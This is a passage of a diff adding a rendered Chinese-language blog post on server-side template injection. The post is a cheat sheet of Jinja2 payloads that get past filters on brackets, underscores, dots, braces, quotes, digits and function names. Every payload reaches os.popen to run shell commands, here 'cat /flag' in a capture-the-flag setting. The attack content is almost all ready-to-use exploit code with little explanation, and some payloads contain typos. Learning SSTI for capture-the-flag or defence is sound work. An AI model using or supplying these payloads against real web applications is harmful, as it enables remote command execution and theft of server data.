+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>魔术方法__getitem__可替代中括号</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">当中括号被过滤时，如下将被限制访问:
+</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[&#39;xx&#39;].[<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>)}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">可用__getitem__替换中括号[]:
+</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(13).__getitem__(&#39;popen&#39;)(&#39;cat /flag&#39;)}}</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<h2 id="过滤下划线" class="heading-element"><span>过滤下划线</span>
+  <a href="#%e8%bf%87%e6%bb%a4%e4%b8%8b%e5%88%92%e7%ba%bf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">原payload被限制:
+</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>).read() }}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1.使用attr()绕过，payload:
+</span></span><span class="line"><span class="cl">{{ () | attr(request.args.a) | attr(request.args.b) | attr(request.args.c) | attr(request.args.d) | attr(request.args.e)()[<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>) | attr(&#39;read&#39;)() }}
+</span></span><span class="line"><span class="cl">同时get方法传参?a=__class__<span class="err">&amp;</span>b=__base__<span class="err">&amp;</span>c=__subclasses__<span class="err">&amp;</span>d=__init__<span class="err">&amp;</span>e=__globals__
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2.将下划线进行编码绕过，payload:
+</span></span><span class="line"><span class="cl">{{ ().[&#39;\x5f\x5fclass\x5f\x5f&#39;][&#39;\x5f\x5fbase\x5f\x5f&#39;][&#39;\x5f\x5fsubclasses\x5f\x5f&#39;]()[xx][&#39;\x5f\x5finit\x5f\x5f&#39;].[&#39;\x5f\x5fglobals\x5f\x5f&#39;][<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>) }}</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<h2 id="过滤点" class="heading-element"><span>过滤点</span>
+  <a href="#%e8%bf%87%e6%bb%a4%e7%82%b9" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">原payload被限制:
+</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__[<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>).read() }}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1.使用attr()绕过，payload:
+</span></span><span class="line"><span class="cl">{{ () | attr(&#39;__class__&#39;) | attr(&#39;__base__&#39;) | attr(&#39;__subclasses__&#39;)() | attr(&#39;__getitem__&#39;)(xx) | attr(&#39;__init__&#39;) | attr(&#39;__globals__&#39;) | attr(&#39;__getitem__&#39;)(&#39;popen&#39;)(&#39;cat /flag&#39;) | attr(&#39;read&#39;)()}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">2.</span> 使用中括号绕过，payload:
+</span></span><span class="line"><span class="cl">{{ ()[&#39;__class__&#39;][&#39;__base__&#39;][&#39;__subclasses__&#39;]()[xx][&#39;__init__&#39;][&#39;__globals__&#39;][<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>)[&#39;read&#39;]()}}</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<h2 id="过滤大括号" class="heading-element"><span>过滤大括号</span>
+  <a href="#%e8%bf%87%e6%bb%a4%e5%a4%a7%e6%8b%ac%e5%8f%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">使用{%%}替代{{}}，payload:
+</span></span><span class="line"><span class="cl">{%print(&#39;&#39;.__class__.__base__.__subclasses__()[xx].__init__.__globals__[<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>).read())%}</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<h2 id="过滤引号" class="heading-element"><span>过滤引号</span>
+  <a href="#%e8%bf%87%e6%bb%a4%e5%bc%95%e5%8f%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">当&#39;被过滤后以下访问将被限制
+</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__[<span class="nt">&#39;popen&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>).read() }}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1.通过request.args的get传参输入引号内的内容，payload：
+</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[<span class="nt">request.args.popen</span>](<span class="na">request.args.cmd</span>).read() }}
+</span></span><span class="line"><span class="cl">同时get传参?popen=popen<span class="err">&amp;</span>cmd=cat /flag
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2.通过request.form的post传参输入引号内的内容，payload：
+</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[117].__init__.__globals__[<span class="nt">request.form.popen</span>](<span class="na">request.form.cmd</span>).read() }}
+</span></span><span class="line"><span class="cl">同时post传参?popen=popen<span class="err">&amp;</span>cmd=cat /flag
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3.使用cookies传参，如request.cookies.k1、request.cookies.k2、k1=popen;k2=cat /flag</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可将下划线进行</p>
+</li>
+<li>
+<h2 id="过滤数字" class="heading-element"><span>过滤数字</span>
+  <a href="#%e8%bf%87%e6%bb%a4%e6%95%b0%e5%ad%97" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">使用过滤器length绕过
+</span></span><span class="line"><span class="cl">{% set a=&#39;aaa&#39; | lenth %}{{ ().__class__.__base__.__subclasses__()[a]}}</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<h2 id="过滤函数名" class="heading-element"><span>过滤函数名</span>
+  <a href="#%e8%bf%87%e6%bb%a4%e5%87%bd%e6%95%b0%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">1.使用拼接绕过，payload:
+</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[<span class="nt">&#39;pop&#39;+&#39;en&#39;</span>](<span class="na">&#39;cat /fl&#39; + &#39;ag&#39;</span>).read() }}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2.16进制编码绕过，payload:
+</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[<span class="nt">&#39;\x70\x6f\x70\x65\x6e&#39;</span>](<span class="na">&#39;cat /flag&#39;</span>).read() }}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3.base64编码绕过，payload:
+</span></span><span class="line"><span class="cl">{{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[<span class="nt">base64.b64decode(&#39;cG9wZW4=&#39;).decode()</span>](<span class="na">&#39;cat /fl&#39; + &#39;ag&#39;</span>).read() }}</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2025-04-20 20:07:05">更新于 2025-04-20&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://hinoatari.github.io/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/" data-hashtag="SSTI注入"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Linkedin" data-sharer="linkedin" data-url="https://hinoatari.github.io/posts/ssti%E6%B3%A8%E5%85%A5%E7%AF%87/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/ssti%E6%B3%A8%E5%85%A5/" class="post-tag" title="标签 - SSTI注入">SSTI注入</a><a href="/tags/web/" class="post-tag" title="标签 - Web">Web</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/sql%E6%B3%A8%E5%85%A5%E7%AF%87/" class="post-nav-item" rel="prev" title="SQL注入篇"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>SQL注入篇</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-1">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.146.5"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.18"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div></div>
+  </footer></div><div class="widgets"><a href="https://github.com/Hinoatari/Hinoatari.github.io" title="在 GitHub 上查看源代码"target="_blank" rel="external nofollow" class="github-corner right d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true" width="56" height="56"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30},"version":"v0.3.18"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
